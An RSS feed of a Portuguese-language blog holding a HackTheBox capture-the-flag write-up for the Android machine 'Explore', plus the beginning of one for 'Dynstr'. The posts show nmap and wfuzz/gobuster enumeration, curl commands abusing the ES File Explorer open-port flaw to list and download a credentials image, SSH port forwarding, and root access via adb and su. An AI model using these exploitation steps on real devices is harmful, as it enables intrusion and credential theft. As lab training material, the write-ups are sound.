<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Haderach</title>
        <link>https://brunomcuesta.github.io/posts/</link>
        <description>Recent content in Posts on Haderach</description>
        <generator>Hugo -- gohugo.io</generator>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Sat, 01 Jan 2022 11:34:42 -0300</lastBuildDate>
        <atom:link href="https://brunomcuesta.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>HackTheBox - Explore</title>
            <link>https://brunomcuesta.github.io/posts/2022/01/hackthebox-explore/</link>
            <pubDate>Sat, 01 Jan 2022 11:34:42 -0300</pubDate>
            
            <guid>https://brunomcuesta.github.io/posts/2022/01/hackthebox-explore/</guid>
            <description>Esta é a primeira máquina Android do HackTheBox. Depois de muitas máquinas com sistemas operacionais, como Linux e Windows, o HTB disponibilizou uma que possui sistema operacional para dispositivos mobile. É bem interessante que isto ocorra, porque também existe pentest para este sistema e a forma de encontrar suas vulnerabilidades será a mesma utilizada em outros sistemas operacionais. Tudo começa com uma enumeração e identificação dos serviços ou aplicativos encontrados.</description>
            <content type="html"><![CDATA[
    <img src="https://i.imgur.com/9ALldY9.png"  alt="Explore Cover"  class="center"  style="border-radius: 8px;"  />


<p>Esta é a primeira máquina Android do <a href="https://www.hackthebox.eu/">HackTheBox</a>. Depois de muitas máquinas com sistemas operacionais, como Linux e Windows, o HTB disponibilizou uma que possui sistema operacional para dispositivos mobile. É bem interessante que isto ocorra, porque também existe pentest para este sistema e a forma de encontrar suas vulnerabilidades será a mesma utilizada em outros sistemas operacionais. Tudo começa com uma enumeração e identificação dos serviços ou aplicativos encontrados. A diferença, neste caso, é a ferramenta usada para acessar o dispositivo.</p>
<h2 id="informações-da-máquina">Informações da Máquina</h2>
<p>IP: 10.129.79.156</p>
<p>Sistema Operacional: Android</p>
<p>Nível de dificuldade: Easy</p>
<h2 id="varredura-e-enumeração">Varredura e Enumeração</h2>
<h3 id="port-scan">Port Scan</h3>
<p>Iniciando um scan completo em todas as portas TCP abertas no host com nmap:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Nmap 7.91 scan initiated Mon Jun 28 20:41:26 2021 as: nmap -vvv -sC -sV -p 2222,42135,45107,59777 --open -Pn -oN details.txt 10.129.79.156</span>
Nmap scan report <span style="color:#66d9ef">for</span> 10.129.79.156
Host is up, received user-set <span style="color:#f92672">(</span>0.33s latency<span style="color:#f92672">)</span>.
Scanned at 2021-06-28 20:41:27 -03 <span style="color:#66d9ef">for</span> 115s

PORT      STATE SERVICE REASON         VERSION
2222/tcp  open  ssh     syn-ack ttl <span style="color:#ae81ff">63</span> <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey: 
|   <span style="color:#ae81ff">2048</span> 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqK2WZkEVE0CPTPpWoyDKZkHVrmffyDgcNNVK3PkamKs3M8tyqeFBivz4o8i9Ai8UlrVZ8mztI3qb+cHCdLMDpaO0ghf/50qYVGH4gU5vuVN0tbBJAR67ot4U+7WCcdh4sZHX5NNatyE36wpKj9t7n2XpEmIYda4CEIeUOy2Mm3Es+GD0AAUl8xG4uMYd2rdrJrrO1p15PO97/1ebsTH6SgFz3qjZvSirpom62WmmMbfRvJtNFiNJRydDpJvag2urk16GM9a0buF4h1JCGwMHxpSY05aKQLo8shdb9SxJRa9lMu3g2zgiDAmBCoKjsiPnuyWW+8G7Vz7X6nJC87KpL
42135/tcp open  http    syn-ack ttl <span style="color:#ae81ff">63</span> ES File Explorer Name Response httpd
|_http-title: Site doesn<span style="color:#e6db74">&#39;t have a title (text/html).
</span><span style="color:#e6db74">45107/tcp open  unknown syn-ack ttl 63
</span><span style="color:#e6db74">| fingerprint-strings: 
</span><span style="color:#e6db74">|   GenericLines: 
</span><span style="color:#e6db74">|     HTTP/1.0 400 Bad Request
</span><span style="color:#e6db74">|     Date: Mon, 28 Jun 2021 23:41:32 GMT
</span><span style="color:#e6db74">|     Content-Length: 22
</span><span style="color:#e6db74">|     Content-Type: text/plain; charset=US-ASCII
</span><span style="color:#e6db74">|     Connection: Close
</span><span style="color:#e6db74">|     Invalid request line:
</span><span style="color:#e6db74">|   GetRequest: 
</span><span style="color:#e6db74">|     HTTP/1.1 412 Precondition Failed
</span><span style="color:#e6db74">|     Date: Mon, 28 Jun 2021 23:41:32 GMT
</span><span style="color:#e6db74">|     Content-Length: 0
</span><span style="color:#e6db74">|   HTTPOptions: 
</span><span style="color:#e6db74">|     HTTP/1.0 501 Not Implemented
</span><span style="color:#e6db74">|     Date: Mon, 28 Jun 2021 23:41:38 GMT
</span><span style="color:#e6db74">|     Content-Length: 29
</span><span style="color:#e6db74">|     Content-Type: text/plain; charset=US-ASCII
</span><span style="color:#e6db74">|     Connection: Close
</span><span style="color:#e6db74">|     Method not supported: OPTIONS
</span><span style="color:#e6db74">|   Help: 
</span><span style="color:#e6db74">|     HTTP/1.0 400 Bad Request
</span><span style="color:#e6db74">|     Date: Mon, 28 Jun 2021 23:41:55 GMT
</span><span style="color:#e6db74">|     Content-Length: 26
</span><span style="color:#e6db74">|     Content-Type: text/plain; charset=US-ASCII
</span><span style="color:#e6db74">|     Connection: Close
</span><span style="color:#e6db74">|     Invalid request line: HELP
</span><span style="color:#e6db74">|   RTSPRequest: 
</span><span style="color:#e6db74">|     HTTP/1.0 400 Bad Request
</span><span style="color:#e6db74">|     Date: Mon, 28 Jun 2021 23:41:39 GMT
</span><span style="color:#e6db74">|     Content-Length: 39
</span><span style="color:#e6db74">|     Content-Type: text/plain; charset=US-ASCII
</span><span style="color:#e6db74">|     Connection: Close
</span><span style="color:#e6db74">|     valid protocol version: RTSP/1.0
</span><span style="color:#e6db74">|   SSLSessionReq: 
</span><span style="color:#e6db74">|     HTTP/1.0 400 Bad Request
</span><span style="color:#e6db74">|     Date: Mon, 28 Jun 2021 23:41:55 GMT
</span><span style="color:#e6db74">|     Content-Length: 73
</span><span style="color:#e6db74">|     Content-Type: text/plain; charset=US-ASCII
</span><span style="color:#e6db74">|     Connection: Close
</span><span style="color:#e6db74">|     Invalid request line: 
</span><span style="color:#e6db74">|     ?G???,???`~?
</span><span style="color:#e6db74">|     ??{????w????&lt;=?o?
</span><span style="color:#e6db74">|   TLSSessionReq: 
</span><span style="color:#e6db74">|     HTTP/1.0 400 Bad Request
</span><span style="color:#e6db74">|     Date: Mon, 28 Jun 2021 23:41:56 GMT
</span><span style="color:#e6db74">|     Content-Length: 71
</span><span style="color:#e6db74">|     Content-Type: text/plain; charset=US-ASCII
</span><span style="color:#e6db74">|     Connection: Close
</span><span style="color:#e6db74">|     Invalid request line: 
</span><span style="color:#e6db74">|     ??random1random2random3random4
</span><span style="color:#e6db74">|   TerminalServerCookie: 
</span><span style="color:#e6db74">|     HTTP/1.0 400 Bad Request
</span><span style="color:#e6db74">|     Date: Mon, 28 Jun 2021 23:41:55 GMT
</span><span style="color:#e6db74">|     Content-Length: 54
</span><span style="color:#e6db74">|     Content-Type: text/plain; charset=US-ASCII
</span><span style="color:#e6db74">|     Connection: Close
</span><span style="color:#e6db74">|     Invalid request line: 
</span><span style="color:#e6db74">|_    Cookie: mstshash=nmap
</span><span style="color:#e6db74">59777/tcp open  http    syn-ack ttl 63 Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
</span><span style="color:#e6db74">|_http-title: Site doesn&#39;</span>t have a title <span style="color:#f92672">(</span>text/plain<span style="color:#f92672">)</span>.
<span style="color:#ae81ff">2</span> services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
<span style="color:#f92672">==============</span>NEXT SERVICE FINGERPRINT <span style="color:#f92672">(</span>SUBMIT INDIVIDUALLY<span style="color:#f92672">)==============</span>
SF-Port2222-TCP:V<span style="color:#f92672">=</span>7.91%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>6/28%Time<span style="color:#f92672">=</span>60DA5E2E%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>NU
SF:LL,24,<span style="color:#e6db74">&#34;SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n&#34;</span><span style="color:#f92672">)</span>;
<span style="color:#f92672">==============</span>NEXT SERVICE FINGERPRINT <span style="color:#f92672">(</span>SUBMIT INDIVIDUALLY<span style="color:#f92672">)==============</span>
SF-Port45107-TCP:V<span style="color:#f92672">=</span>7.91%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>6/28%Time<span style="color:#f92672">=</span>60DA5E2E%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>G
SF:enericLines,AA,<span style="color:#e6db74">&#34;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Mon,\x20
</span><span style="color:#e6db74">SF:28\x20Jun\x202021\x2023:41:32\x20GMT\r\nContent-Length:\x2022\r\nConten
</span><span style="color:#e6db74">SF:t-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\
</span><span style="color:#e6db74">SF:r\nInvalid\x20request\x20line:\x20&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>GetRequest,5C,<span style="color:#e6db74">&#34;HTTP/1\.1\x20412\
</span><span style="color:#e6db74">SF:x20Precondition\x20Failed\r\nDate:\x20Mon,\x2028\x20Jun\x202021\x2023:4
</span><span style="color:#e6db74">SF:1:32\x20GMT\r\nContent-Length:\x200\r\n\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>HTTPOptions,B5,<span style="color:#e6db74">&#34;HTTP/1\
</span><span style="color:#e6db74">SF:.0\x20501\x20Not\x20Implemented\r\nDate:\x20Mon,\x2028\x20Jun\x202021\x
</span><span style="color:#e6db74">SF:2023:41:38\x20GMT\r\nContent-Length:\x2029\r\nContent-Type:\x20text/pla
</span><span style="color:#e6db74">SF:in;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nMethod\x20not\x2
</span><span style="color:#e6db74">SF:0supported:\x20OPTIONS&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RTSPRequest,BB,<span style="color:#e6db74">&#34;HTTP/1\.0\x20400\x20Bad\x20R
</span><span style="color:#e6db74">SF:equest\r\nDate:\x20Mon,\x2028\x20Jun\x202021\x2023:41:39\x20GMT\r\nCont
</span><span style="color:#e6db74">SF:ent-Length:\x2039\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r
</span><span style="color:#e6db74">SF:\nConnection:\x20Close\r\n\r\nNot\x20a\x20valid\x20protocol\x20version:
</span><span style="color:#e6db74">SF:\x20\x20RTSP/1\.0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Help,AE,<span style="color:#e6db74">&#34;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDa
</span><span style="color:#e6db74">SF:te:\x20Mon,\x2028\x20Jun\x202021\x2023:41:55\x20GMT\r\nContent-Length:\
</span><span style="color:#e6db74">SF:x2026\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection
</span><span style="color:#e6db74">SF::\x20Close\r\n\r\nInvalid\x20request\x20line:\x20HELP&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SSLSessionReq
SF:,DD,<span style="color:#e6db74">&#34;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Mon,\x2028\x20Jun\x
</span><span style="color:#e6db74">SF:202021\x2023:41:55\x20GMT\r\nContent-Length:\x2073\r\nContent-Type:\x20
</span><span style="color:#e6db74">SF:text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nInvalid\
</span><span style="color:#e6db74">SF:x20request\x20line:\x20\x16\x03\0\0S\x01\0\0O\x03\0\?G\?\?\?,\?\?\?`~\?
</span><span style="color:#e6db74">SF:\0\?\?{\?\?\?\?w\?\?\?\?&lt;=\?o\?\x10n\0\0\(\0\x16\0\x13\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>TerminalSe
SF:rverCookie,CA,<span style="color:#e6db74">&#34;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Mon,\x202
</span><span style="color:#e6db74">SF:8\x20Jun\x202021\x2023:41:55\x20GMT\r\nContent-Length:\x2054\r\nContent
</span><span style="color:#e6db74">SF:-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r
</span><span style="color:#e6db74">SF:\nInvalid\x20request\x20line:\x20\x03\0\0\*%\?\0\0\0\0\0Cookie:\x20msts
</span><span style="color:#e6db74">SF:hash=nmap&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>TLSSessionReq,DB,<span style="color:#e6db74">&#34;HTTP/1\.0\x20400\x20Bad\x20Request\r\nD
</span><span style="color:#e6db74">SF:ate:\x20Mon,\x2028\x20Jun\x202021\x2023:41:56\x20GMT\r\nContent-Length:
</span><span style="color:#e6db74">SF:\x2071\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnectio
</span><span style="color:#e6db74">SF:n:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20\x16\x03\0\0i\x01\0\0
</span><span style="color:#e6db74">SF:e\x03\x03U\x1c\?\?random1random2random3random4\0\0\x0c\0/\0&#34;</span><span style="color:#f92672">)</span>;
Service Info: Device: phone

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span style="color:#75715e"># Nmap done at Mon Jun 28 20:43:22 2021 -- 1 IP address (1 host up) scanned in 116.23 seconds</span>

</code></pre></div><p>O resultado do nmap já entrega um serviço suspeito rodando na porta 54107, o &lsquo;ES File Explorer&rsquo;. Este é o nome de um conhecido navegador de arquivos para Android.</p>
<h3 id="diretórios-e-arquivos">Diretórios e arquivos</h3>
<p>Continuando com a enumeração, podemos visualizar os diretórios do dispositivo com o wfuzz.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404,400 http://10.129.79.156:59777/FUZZ
</code></pre></div><p>Saída do comando.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">000000157:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">3</span> W        <span style="color:#ae81ff">71</span> Ch       <span style="color:#e6db74">&#34;product&#34;</span>                                                                                               
000000182:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">3</span> W        <span style="color:#ae81ff">65</span> Ch       <span style="color:#e6db74">&#34;data&#34;</span>                                                                                                  
000000334:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">3</span> W        <span style="color:#ae81ff">59</span> Ch       <span style="color:#e6db74">&#34;d&#34;</span>                                                                                                     
000000482:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">3</span> W        <span style="color:#ae81ff">71</span> Ch       <span style="color:#e6db74">&#34;storage&#34;</span>                                                                                               
000000483:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">3</span> W        <span style="color:#ae81ff">63</span> Ch       <span style="color:#e6db74">&#34;bin&#34;</span>                                                                                                   
000000706:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">3</span> W        <span style="color:#ae81ff">69</span> Ch       <span style="color:#e6db74">&#34;system&#34;</span>                                                                                                
000000721:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">3</span> W        <span style="color:#ae81ff">63</span> Ch       <span style="color:#e6db74">&#34;lib&#34;</span>                                                                                                   
000000834:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">3</span> W        <span style="color:#ae81ff">63</span> Ch       “dev”
000001083:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">3</span> W        <span style="color:#ae81ff">67</span> Ch       <span style="color:#e6db74">&#34;cache&#34;</span>                                                                                                 
000001411:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">3</span> W        <span style="color:#ae81ff">63</span> Ch       <span style="color:#e6db74">&#34;etc&#34;</span>                                                                                                   
000001481:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">3</span> W        <span style="color:#ae81ff">69</span> Ch       <span style="color:#e6db74">&#34;vendor&#34;</span>                                                                                                
000001490:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">3</span> W        <span style="color:#ae81ff">69</span> Ch       <span style="color:#e6db74">&#34;config&#34;</span>
000002524:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">3</span> W        <span style="color:#ae81ff">63</span> Ch       <span style="color:#e6db74">&#34;oem&#34;</span>                                                                                                   
000003790:   <span style="color:#ae81ff">403</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">4</span> W        <span style="color:#ae81ff">32</span> Ch       <span style="color:#e6db74">&#34;%20&#34;</span>                                                                                                   
000004201:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">3</span> W        <span style="color:#ae81ff">63</span> Ch       <span style="color:#e6db74">&#34;sys&#34;</span> 

</code></pre></div><p>O sdcard é o diretório de armazenamento interno do Android e nele foi feito um scan em busca de algum arquivo de texto ou outro arquivo que seja útil.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404,400 http://10.129.79.156:59777/sdcard/FUZZ.txt
</code></pre></div><p>Saída do comando.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">000000125:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">1</span> L      <span style="color:#ae81ff">1</span> W        <span style="color:#ae81ff">33</span> Ch       <span style="color:#e6db74">&#34;user&#34;</span>
</code></pre></div><p>O resultado acima nos mostra a primeira flag, a do user.txt.</p>
<h2 id="vulnerabilidade">Vulnerabilidade</h2>
<p>O nmap mostrou que o aplicativo &lsquo;ES File Explorer&rsquo; está ouvindo na porta 42135, então uma busca foi feita para encontrar algum exploit.</p>

    <img src="https://i.imgur.com/pCoNNHD.png"  alt="ES File Explorer exploit"  class="center"  style="border-radius: 8px;"  />


<p>O resultado da pesquisa mostra este <a href="https://medium.com/@knownsec404team/analysis-of-es-file-explorer-security-vulnerability-cve-2019-6447-7f34407ed566">artigo</a> mostrando como executar comandos com o curl para obter informações do &lsquo;ES File Explorer&rsquo;.</p>

    <img src="https://i.imgur.com/iqv4iKD.png"  alt="ES File Explorer CVE"  class="center"  style="border-radius: 8px;"  />


<p>O mesmo pode ser feito com este <a href="https://github.com/fs0c131y/ESFileExplorerOpenPortVuln">exploit</a> em Python.</p>
<h2 id="exploração">Exploração</h2>
<p>O comando curl fará a requisição ao IP e porta localizados no nmap, mas enviará também o comando esperado pelo &lsquo;ES File Explorer&rsquo;. Abaixo o comando &lsquo;getDeviceInfo&rsquo; foi enviado para obter informações do dispositivo.</p>

    <img src="https://i.imgur.com/Pxvsng6.png"  alt="Exploração"  class="center"  style="border-radius: 8px;"  />


<p>O ES pode receber vários outros comandos, como mostrado a seguir.</p>

    <img src="https://i.imgur.com/EkO3SdC.png"  alt="Comands ES"  class="center"  style="border-radius: 8px;"  />


<p>Depois de testar alguns comandos da listagem acima, uma imagem suspeita foi localizada com o comando &lsquo;listPics&rsquo;.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl --header <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> --request POST --data <span style="color:#e6db74">&#39;{&#34;command&#34;:&#34;listPics&#34;}&#39;</span> http://10.129.79.156:59777
</code></pre></div>
    <img src="https://i.imgur.com/1nIP97m.png"  alt="Listando arquivos de imagens"  class="center"  style="border-radius: 8px;"  />


<p>Analisando os arquivos de imagem encontrados, o mais suspeito é o creds.jpg.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;creds.jpg&#34;</span>, <span style="color:#e6db74">&#34;time&#34;</span>:<span style="color:#e6db74">&#34;4/21/21 02:38:18 AM&#34;</span>, <span style="color:#e6db74">&#34;location&#34;</span>:<span style="color:#e6db74">&#34;/storage/emulated/0/DCIM/creds.jpg&#34;</span>, <span style="color:#e6db74">&#34;size&#34;</span>:<span style="color:#e6db74">&#34;1.14 MB (1,200,401 Bytes)&#34;</span>, <span style="color:#f92672">}</span>,
</code></pre></div><p>Baixando a imagem.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wget http://10.129.79.156:59777/storage/emulated/0/DCIM/creds.jpg
</code></pre></div><p>Ao abrir a imagem surge uma credencial, que será utilizada para acessar o dispositivo.</p>

    <img src="https://i.imgur.com/UZPL7BI.jpg"  alt="Credenciais"  class="center"  style="border-radius: 8px;"  />


<p>Com esta credencial já é possível acessar o SSH no dispositivo.</p>

    <img src="https://i.imgur.com/BfxQZsm.png"  alt="SSH Port-Forwarding"  class="center"  style="border-radius: 8px;"  />


<p>Após enumerar diretórios é necessário também verificar as portas locais abertas no dispositivo.</p>

    <img src="https://i.imgur.com/7EE8Qnd.png"  alt="Portas abertas"  class="center"  style="border-radius: 8px;"  />


<p>Foi encontrada a porta 5555 aberta e para poder acessá-la desde a máquina local um SSH port-forwarding foi feito.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh -L 5555:127.0.0.1:5555 kristi@10.129.79.156 -p <span style="color:#ae81ff">2222</span>
</code></pre></div><h2 id="escalação-de-privilégios">Escalação de Privilégios</h2>
<p>Tendo a porta 5555 do dispositivo aberta localmente, é possível conectar-se utilizando o adb.</p>
<p>Instalando o adb.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo apt install adb
</code></pre></div><p>Conectando na porta 5555 localmente com adb e obtendo uma shell de usuário.</p>

    <img src="https://i.imgur.com/MP85qei.png"  alt="Adb shell"  class="center"  style="border-radius: 8px;"  />


<p>Uma vez conectado basta rodar o &lsquo;su&rsquo; no terminal para obter a shell do root.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">su
</code></pre></div>
    <img src="https://i.imgur.com/6W2TT3G.png"  alt="Sheel root"  class="center"  style="border-radius: 8px;"  />


<p>Listando os arquivos em modo root.</p>

    <img src="https://i.imgur.com/qHOUB0m.png"  alt="Diretórios"  class="center"  style="border-radius: 8px;"  />


<p>Dentro do diretório &lsquo;data&rsquo; encontra-se a flag do root.</p>

    <img src="https://i.imgur.com/IkO9MXp.png"  alt="Root flag"  class="center"  style="border-radius: 8px;"  />


<p>Até a próxima!</p>
]]></content>
        </item>
        
        <item>
            <title>HackTheBox - Dynstr</title>
            <link>https://brunomcuesta.github.io/posts/2021/10/hackthebox-dynstr/</link>
            <pubDate>Thu, 21 Oct 2021 12:28:42 -0300</pubDate>
            
            <guid>https://brunomcuesta.github.io/posts/2021/10/hackthebox-dynstr/</guid>
            <description>Nesta máquina do HackTheBox o atacante deve explorar uma vulnerabilidade em um servidor de DNS dinâmico. Um script PHP, que é responsável pela atualização dos nomes de subdomínios, recebe um parâmetro via GET e o executa sem nenhum tipo de tratamento, o que permite a um atacante injetar código malicioso em um request e acessar o servidor. O script executa o nsupdate, o que permite ao invasor o registro de um subdomínio no server.</description>
            <content type="html"><![CDATA[
    <img src="https://i.imgur.com/gSSI70J.png"  alt="Dynstr Cover"  class="center"  style="border-radius: 8px;"  />


<p>Nesta máquina do HackTheBox o atacante deve explorar uma vulnerabilidade em um servidor de DNS dinâmico. Um script PHP, que é responsável pela atualização dos nomes de subdomínios, recebe um parâmetro via GET e o executa sem nenhum tipo de tratamento, o que permite a um atacante injetar código malicioso em um request e acessar o servidor. O script executa o <a href="https://linux.die.net/man/8/nsupdate">nsupdate</a>, o que permite ao invasor o registro de um subdomínio no server. Com uma enumeração local se descobre a chave SSH de um usuário que permite acesso remoto ao servidor. O usuário local possui permissões para executar um script com o sudo e desta forma é possível escalar privilégios abusando da vulnerabilidade no script.</p>
<h2 id="informações-da-máquina">Informações da Máquina</h2>
<p>IP: 10.10.10.244</p>
<p>Sistema Operacional: Linux</p>
<p>Nível de dificuldade: Medium</p>
<h2 id="varredura-e-enumeração">Varredura e Enumeração</h2>
<h3 id="port-scan">Port Scan</h3>
<p>Iniciando um scan completo em todas as portas TCP abertas com nmap descobrimos apenas três portas: 22 (SSH), 53 (DNS) e 80 (HTTP). O sistema operacional do host é Ubuntu Linux.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Nmap 7.91 scan initiated Fri Jul 16 22:55:22 2021 as: nmap -v -sV -sC -p 22,53,80 -Pn -oN details.txt 10.10.10.244</span>
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.244
Host is up <span style="color:#f92672">(</span>0.21s latency<span style="color:#f92672">)</span>.

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey: 
|   <span style="color:#ae81ff">3072</span> 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
|   <span style="color:#ae81ff">256</span> 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
|_  <span style="color:#ae81ff">256</span> cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
53/tcp open  domain  ISC BIND 9.16.1 <span style="color:#f92672">(</span>Ubuntu Linux<span style="color:#f92672">)</span>
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
|_http-title: Dyna DNS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span style="color:#75715e"># Nmap done at Fri Jul 16 22:55:41 2021 -- 1 IP address (1 host up) scanned in 18.60 seconds</span>
</code></pre></div><p>Enumerando diretórios e arquivos na raíz da aplicação web com gobuster encontramos um diretório chamado <strong>nic</strong>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://10.10.10.244 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt

/nic                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 310<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.10.244/nic/<span style="color:#f92672">]</span> 
</code></pre></div><p>Prosseguindo com o scan neste diretório surge um recurso chamado <strong>update</strong>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://10.10.10.244/nic -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt

/update               <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 8<span style="color:#f92672">]</span>
</code></pre></div><h3 id="webserver">Webserver</h3>
<p>Página inicial.</p>

